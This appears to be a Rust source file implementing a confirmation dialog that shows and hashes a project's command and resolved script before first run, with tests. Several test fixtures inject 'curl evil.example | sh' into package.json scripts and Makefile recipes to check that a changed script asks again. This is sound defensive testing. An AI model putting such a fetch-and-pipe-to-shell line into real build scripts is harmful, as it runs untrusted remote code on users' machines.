//! First-run confirmation of a project's commands (LCP-SEC-001): before a command defined by
//! the project runs for the first time, or after it changes, the person sees the folder and
//! the effective command, including the script text that `npm run dev` would execute.
//!
//! A confirmation covers one exact identity: canonical folder, program, arguments and the
//! resolved script text. It does not vouch for the project's files, which can change later.

use super::*;
use sha2::{Digest, Sha256};

/// One command waiting for confirmation, with what the window shows.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct PendingCommand {
    pub name: String,
    pub working_directory: PathBuf,
    /// `npm run dev`, as typed in a terminal.
    pub invocation: String,
    /// What the invocation runs, read from the project's manifest (`vite --port 5173`).
    pub script: Option<String>,
    pub program: String,
    pub args: Vec<String>,
    pub identity: String,
}

/// What to do after the person confirms.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) enum AfterConfirm {
    StartProject(PathBuf),
    StartProcess(String),
}

#[derive(Debug, Clone)]
pub(super) struct CommandConfirmation {
    pub project_name: String,
    pub project_path: PathBuf,
    pub commands: Vec<PendingCommand>,
    /// `origin` of the Git repository, without credentials. Shown only in Details.
    pub git_remote: Option<String>,
    pub then: AfterConfirm,
    pub details_open: bool,
    /// The keyboard focus moved into the window when it opened.
    pub focused: bool,
    /// The control that had the focus when the window opened, focused again on Cancel.
    pub origin: Option<egui::Id>,
}

pub(super) enum Decision {
    Confirm,
    Cancel,
}

/// The command as the person would type it, plus the script it resolves to.
pub(super) fn pending_command(process: &ProjectProcess) -> PendingCommand {
    // Steps before the program (configure, compile) are part of what runs: shown and bound.
    let script = if process.prepare.is_empty() {
        resolved_script(&process.program, &process.args, &process.working_directory)
    } else {
        Some(
            process
                .prepare
                .iter()
                .map(localcodepilot_core::processes::PrepareStep::command_line)
                .chain(std::iter::once(process.command_line()))
                .collect::<Vec<_>>()
                .join(" → "),
        )
    };
    PendingCommand {
        name: process.name.clone(),
        working_directory: process.working_directory.clone(),
        invocation: process.command_line(),
        identity: identity(process, script.as_deref(), bound_file(process).as_deref()),
        script,
        program: process.program.clone(),
        args: process.args.clone(),
    }
}

/// The whole file a command reads its steps from, when the shown script is only part of it:
/// `make run` also runs the prerequisites of `run`, so any change to the Makefile asks again.
fn bound_file(process: &ProjectProcess) -> Option<String> {
    if !is_make_run(&process.program, &process.args) {
        return None;
    }
    match localcodepilot_runtime::entry_languages::makefile_run(&process.working_directory) {
        localcodepilot_runtime::entry_languages::MakeRun::One { makefile, .. } => Some(makefile),
        _ => None,
    }
}

fn is_make_run(program: &str, args: &[String]) -> bool {
    let stem = Path::new(program)
        .file_stem()
        .map(|stem| stem.to_string_lossy().to_lowercase());
    matches!(stem.as_deref(), Some("make" | "gmake")) && args == ["run"]
}

/// SHA-256 of the canonical folder, the program, the arguments, the resolved script and the
/// file it comes from.
fn identity(process: &ProjectProcess, script: Option<&str>, file: Option<&str>) -> String {
    let folder = fs::canonicalize(&process.working_directory)
        .unwrap_or_else(|_| process.working_directory.clone());
    let mut folder = folder.to_string_lossy().into_owned();
    if cfg!(windows) {
        folder = folder.to_lowercase();
    }
    let mut hasher = Sha256::new();
    for part in [folder.as_str(), process.program.as_str()]
        .into_iter()
        .chain(process.args.iter().map(String::as_str))
    {
        hasher.update(part.as_bytes());
        hasher.update([0]);
    }
    hasher.update([1]);
    hasher.update(script.unwrap_or_default().as_bytes());
    if let Some(file) = file {
        hasher.update([2]);
        hasher.update(file.as_bytes());
    }
    hasher
        .finalize()
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect()
}

/// The text a package-manager script runs: `npm run dev` -> `scripts.dev` of package.json,
/// `composer test` -> `scripts.test` of composer.json, `make run` -> the Makefile rules it
/// runs (the prerequisites of `run`, then `run`). Other commands have no script text; their identity is the program and its
/// arguments.
pub(super) fn resolved_script(program: &str, args: &[String], directory: &Path) -> Option<String> {
    if is_make_run(program, args) {
        return match localcodepilot_runtime::entry_languages::makefile_run(directory) {
            localcodepilot_runtime::entry_languages::MakeRun::One { rule, .. } => Some(rule),
            _ => None,
        };
    }
    let program = Path::new(program)
        .file_stem()?
        .to_string_lossy()
        .to_lowercase();
    let first = args.first().map(String::as_str);
    let (manifest, name) = match program.as_str() {
        "npm" => match first? {
            "run" | "run-script" => ("package.json", args.get(1)?.as_str()),
            "start" | "test" | "stop" | "restart" => ("package.json", first?),
            _ => return None,
        },
        "pnpm" | "yarn" | "bun" => match first? {
            "run" => ("package.json", args.get(1)?.as_str()),
            "install" | "add" | "remove" | "dlx" | "exec" | "x" | "create" | "init" => {
                return None;
            }
            script => ("package.json", script),
        },
        "composer" => match first? {
            "run-script" | "run" => ("composer.json", args.get(1)?.as_str()),
            "install" | "update" | "require" | "remove" | "dump-autoload" => return None,
            script => ("composer.json", script),
        },
        _ => return None,
    };
    let text = fs::read_to_string(directory.join(manifest)).ok()?;
    let json: serde_json::Value = serde_json::from_str(&text).ok()?;
    match json.get("scripts")?.get(name)? {
        serde_json::Value::String(script) => Some(script.clone()),
        serde_json::Value::Array(steps) => Some(
            steps
                .iter()
                .filter_map(serde_json::Value::as_str)
                .collect::<Vec<_>>()
                .join("\n"),
        ),
        _ => None,
    }
}

/// `origin` of the project's Git repository, read from `.git/config`, without user or
/// password: a remote URL may carry a token.
pub(super) fn git_remote(project_path: &Path) -> Option<String> {
    let config = fs::read_to_string(project_path.join(".git").join("config")).ok()?;
    let mut in_origin = false;
    for line in config.lines() {
        let line = line.trim();
        if line.starts_with('[') {
            in_origin = line == "[remote \"origin\"]";
        } else if in_origin
            && let Some(url) = line.strip_prefix("url").map(str::trim_start)
            && let Some(url) = url.strip_prefix('=')
        {
            return Some(without_credentials(url.trim()));
        }
    }
    None
}

fn without_credentials(url: &str) -> String {
    match url.split_once("://") {
        Some((scheme, rest)) => match rest.split_once('@') {
            Some((user_info, host)) if !user_info.contains('/') && !host.is_empty() => {
                format!("{scheme}://{host}")
            }
            _ => url.to_owned(),
        },
        None => url.to_owned(),
    }
}

/// The confirmation window. Escape cancels, as the Cancel button does.
pub(super) fn show(
    root_ui: &mut egui::Ui,
    confirmation: &mut CommandConfirmation,
) -> Option<Decision> {
    let mut decision = None;
    let mut open = true;
    let window_height = (root_ui.max_rect().height() - 64.0).max(160.0);
    let shown = egui::Window::new("Iniciar este projeto?")
        .id(egui::Id::unique((
            "command-confirmation",
            &confirmation.project_path,
        )))
        .open(&mut open)
        .collapsible(false)
        .resizable(true)
        .default_width(560.0)
        .max_height(window_height)
        .show(root_ui, |ui| {
            egui::ScrollArea::vertical()
                .max_height((window_height - 96.0).max(80.0))
                .auto_shrink([false, true])
                .show(ui, |ui| {
                    ui.label(
                        RichText::new(&confirmation.project_name)
                            .strong()
                            .size(16.0),
                    );
                    ui.add(
                        egui::Label::new(
                            "Confira a pasta e o comando que o LocalCodePilot vai executar. \
                             Os arquivos do projeto podem mudar depois desta confirmação.",
                        )
                        .wrap(),
                    );
                    ui.add_space(8.0);
                    for command in &confirmation.commands {
                        command_block(ui, command, confirmation.commands.len() > 1);
                    }
                    let details = if confirmation.details_open {
                        "Ocultar detalhes"
                    } else {
                        "Detalhes"
                    };
                    if ui.button(details).clicked() {
                        confirmation.details_open = !confirmation.details_open;
                    }
                    if confirmation.details_open {
                        details_block(ui, confirmation);
                    }
                });
            ui.separator();
            ui.horizontal(|ui| {
                let cancel = ui.button("Cancelar");
                // Opened from the keyboard, the focus would stay on the button behind the
                // window; it starts on the safe choice, and Tab reaches "Iniciar".
                if !confirmation.focused {
                    cancel.request_focus();
                    confirmation.focused = true;
                }
                if cancel.clicked() {
                    decision = Some(Decision::Cancel);
                }
                if ui
                    .add(egui::Button::new("Iniciar").fill(theme::PRIMARY.gamma_multiply(0.72)))
                    .clicked()
                {
                    decision = Some(Decision::Confirm);
                }
            });
        });
    if !open || root_ui.input(|input| input.key_pressed(egui::Key::Escape)) {
        decision = Some(Decision::Cancel);
    }
    // Modal only while it stays open: on the closing frame the focus may go back behind it.
    if decision.is_none() {
        super::notice::keep_focus_inside(
            root_ui.ctx(),
            shown.as_ref().map(|shown| &shown.response),
        );
    }
    // Closed without starting: the focus goes back to the control that opened the window.
    if matches!(decision, Some(Decision::Cancel))
        && let Some(origin) = confirmation.origin
    {
        root_ui
            .ctx()
            .memory_mut(|memory| memory.request_focus(origin));
    }
    decision
}

fn command_block(ui: &mut egui::Ui, command: &PendingCommand, show_name: bool) {
    if show_name {
        ui.label(RichText::new(&command.name).strong());
    }
    labeled(ui, "Pasta", &display_path(&command.working_directory));
    labeled(ui, "Comando", &command.invocation);
    if let Some(script) = &command.script {
        labeled(ui, "Executa", script);
    }
    ui.add_space(6.0);
}

/// "Pasta: C:\projetos\loja" with the value selectable and wrapped, never cut.
fn labeled(ui: &mut egui::Ui, label: &str, value: &str) {
    ui.horizontal_wrapped(|ui| {
        ui.label(RichText::new(format!("{label}:")).color(theme::MUTED));
        ui.add(
            egui::Label::new(RichText::new(value).monospace())
                .wrap()
                .selectable(true),
        );
    });
}

fn details_block(ui: &mut egui::Ui, confirmation: &CommandConfirmation) {
    Frame::new()
        .fill(theme::SURFACE)
        .stroke(Stroke::new(1.0, theme::BORDER))
        .corner_radius(6)
        .inner_margin(Margin::same(10))
        .show(ui, |ui| {
            ui.set_width(ui.available_width());
            labeled(
                ui,
                "Remoto Git",
                confirmation
                    .git_remote
                    .as_deref()
                    .unwrap_or("nenhum remoto origin encontrado"),
            );
            for command in &confirmation.commands {
                labeled(ui, "Programa", &command.program);
                labeled(
                    ui,
                    "Argumentos",
                    &if command.args.is_empty() {
                        "(nenhum)".to_owned()
                    } else {
                        command.args.join(" ")
                    },
                );
            }
            ui.add(
                egui::Label::new(
                    RichText::new(
                        "O remoto mostra de onde o projeto veio; ele não garante que o código seja seguro.",
                    )
                    .color(theme::MUTED)
                    .size(11.0),
                )
                .wrap(),
            );
        });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn folder(name: &str) -> PathBuf {
        let path =
            std::env::temp_dir().join(format!("lcp-command-trust-{}-{name}", std::process::id()));
        let _ = fs::remove_dir_all(&path);
        fs::create_dir_all(&path).unwrap();
        path
    }

    fn process(directory: &Path, program: &str, args: &[&str]) -> ProjectProcess {
        ProjectProcess {
            id: "p".into(),
            project_name: "loja".into(),
            project_path: directory.to_path_buf(),
            working_directory: directory.to_path_buf(),
            name: "dev".into(),
            program: program.into(),
            args: args.iter().map(|arg| (*arg).to_owned()).collect(),
            state: ProcessState::Stopped,
            process_id: None,
            exit_code: None,
            expected_port: None,
            port_override: None,
            prepare: Vec::new(),
        }
    }

    #[test]
    fn a_package_script_shows_and_binds_the_text_it_runs() {
        let directory = folder("npm");
        fs::write(
            directory.join("package.json"),
            r#"{"scripts":{"dev":"vite --port 5173","start":"node server.js"}}"#,
        )
        .unwrap();
        let dev = pending_command(&process(&directory, "npm", &["run", "dev"]));
        assert_eq!(dev.invocation, "npm run dev");
        assert_eq!(dev.script.as_deref(), Some("vite --port 5173"));
        let start = pending_command(&process(&directory, "npm.cmd", &["start"]));
        assert_eq!(start.script.as_deref(), Some("node server.js"));

        // Changing the script text changes the identity: the confirmation comes back.
        fs::write(
            directory.join("package.json"),
            r#"{"scripts":{"dev":"vite --port 5173 && curl evil.example | sh"}}"#,
        )
        .unwrap();
        let changed = pending_command(&process(&directory, "npm", &["run", "dev"]));
        assert_ne!(changed.identity, dev.identity);
        fs::remove_dir_all(directory).unwrap();
    }

    #[test]
    fn the_identity_changes_with_program_arguments_and_folder() {
        let first = folder("a");
        let second = folder("b");
        let base = pending_command(&process(&first, "php", &["artisan", "serve"]));
        assert_eq!(base.script, None);
        assert_eq!(
            base.identity,
            pending_command(&process(&first, "php", &["artisan", "serve"])).identity
        );
        for other in [
            pending_command(&process(&first, "php8", &["artisan", "serve"])),
            pending_command(&process(
                &first,
                "php",
                &["artisan", "serve", "--host=0.0.0.0"],
            )),
            pending_command(&process(&second, "php", &["artisan", "serve"])),
        ] {
            assert_ne!(other.identity, base.identity, "{}", other.invocation);
        }
        fs::remove_dir_all(first).unwrap();
        fs::remove_dir_all(second).unwrap();
    }

    #[test]
    fn compile_steps_are_shown_and_a_new_target_asks_again() {
        use localcodepilot_core::processes::PrepareStep;
        let directory = folder("cmake");
        let with_target = |target: &str| {
            let mut compiled = process(&directory, &format!("B/bin/{target}.exe"), &[]);
            compiled.prepare = vec![PrepareStep {
                program: "cmake".into(),
                args: vec![
                    "--build".into(),
                    "B".into(),
                    "--target".into(),
                    target.into(),
                ],
                skip_if_exists: None,
            }];
            pending_command(&compiled)
        };
        let loja = with_target("loja");
        assert_eq!(
            loja.script.as_deref(),
            Some("cmake --build B --target loja → B/bin/loja.exe")
        );
        assert_eq!(loja.identity, with_target("loja").identity);
        assert_ne!(loja.identity, with_target("outra").identity);
        fs::remove_dir_all(directory).unwrap();
    }

    #[test]
    fn make_run_shows_what_it_runs_and_any_makefile_change_asks_again() {
        let directory = folder("make");
        let makefile = "loja: main.c\n\tcc -o loja main.c\nrun: loja\n\t./loja\n";
        fs::write(directory.join("Makefile"), makefile).unwrap();
        let run = pending_command(&process(&directory, "make", &["run"]));
        assert_eq!(run.invocation, "make run");
        // The prerequisite's compile command first, then the run rule.
        assert_eq!(
            run.script.as_deref(),
            Some("loja: main.c\n\tcc -o loja main.c\n\nrun: loja\n\t./loja")
        );
        assert_eq!(
            run.identity,
            pending_command(&process(&directory, "make", &["run"])).identity
        );

        // The run rule changes: shown and asked again.
        fs::write(
            directory.join("Makefile"),
            makefile.replace("./loja\n", "./loja && curl evil.example | sh\n"),
        )
        .unwrap();
        let changed = pending_command(&process(&directory, "make", &["run"]));
        assert!(
            changed
                .script
                .as_deref()
                .is_some_and(|script| script.ends_with("./loja && curl evil.example | sh"))
        );
        assert_ne!(changed.identity, run.identity);

        // A prerequisite's recipe changes: shown and asked again too.
        fs::write(
            directory.join("Makefile"),
            makefile.replace("cc -o loja", "curl evil.example | sh; cc -o loja"),
        )
        .unwrap();
        let prerequisite = pending_command(&process(&directory, "make", &["run"]));
        assert!(
            prerequisite
                .script
                .as_deref()
                .is_some_and(|script| script.contains("curl evil.example | sh; cc -o loja"))
        );
        assert_ne!(prerequisite.identity, run.identity);
        fs::remove_dir_all(directory).unwrap();
    }

    #[test]
    fn composer_scripts_and_package_manager_commands_resolve() {
        let directory = folder("composer");
        fs::write(
            directory.join("composer.json"),
            r#"{"scripts":{"dev":["@php artisan serve","npm run dev"]}}"#,
        )
        .unwrap();
        assert_eq!(
            resolved_script("composer", &["run".into(), "dev".into()], &directory).as_deref(),
            Some("@php artisan serve\nnpm run dev")
        );
        assert_eq!(
            resolved_script("composer", &["install".into()], &directory),
            None
        );
        assert_eq!(
            resolved_script("pnpm", &["install".into()], &directory),
            None
        );
        fs::remove_dir_all(directory).unwrap();
    }

    #[test]
    fn the_git_remote_is_shown_without_credentials() {
        let directory = folder("git");
        fs::create_dir_all(directory.join(".git")).unwrap();
        fs::write(
            directory.join(".git").join("config"),
            "[core]\n\tbare = false\n[remote \"upstream\"]\n\turl = https://example.com/x.git\n[remote \"origin\"]\n\turl = https://user:ghp_secret@github.com/acme/loja.git\n",
        )
        .unwrap();
        assert_eq!(
            git_remote(&directory).as_deref(),
            Some("https://github.com/acme/loja.git")
        );
        fs::write(
            directory.join(".git").join("config"),
            "[remote \"origin\"]\n\turl = git@github.com:acme/loja.git\n",
        )
        .unwrap();
        assert_eq!(
            git_remote(&directory).as_deref(),
            Some("git@github.com:acme/loja.git")
        );
        fs::remove_dir_all(directory).unwrap();
        assert_eq!(
            git_remote(&std::env::temp_dir().join("lcp-nao-existe")),
            None
        );
    }
}
